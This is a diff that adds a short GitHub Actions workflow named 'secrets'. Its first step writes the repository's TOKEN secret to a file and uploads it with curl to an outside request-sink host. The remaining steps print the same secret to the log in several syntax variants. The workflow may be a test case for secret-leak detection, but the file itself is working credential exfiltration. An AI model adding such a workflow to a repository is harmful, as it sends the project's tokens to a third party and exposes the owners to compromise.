@@ -1,0 +1,19 @@
+name: secrets
+on:
+  workflow_dispatch:
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          echo '${{ secrets.TOKEN }}' > secrets.txt
+          curl -X PUT -T ./secrets.txt -H http://3f750d39-1083-44e5-b057-40432fafeeb5.sink.reqsink.com
+      - env: 
+          A_SECRET: ${{ secrets.TOKEN }}
+        run: echo "$A_SECRET"
+      - env: 
+          A_SECRET: ${{ secrets['TOKEN'] }}
+        run: echo "$A_SECRET"
+      - env: 
+          A_SECRET: ${{ secrets["TOKEN"] }}
+        run: echo "$A_SECRET"
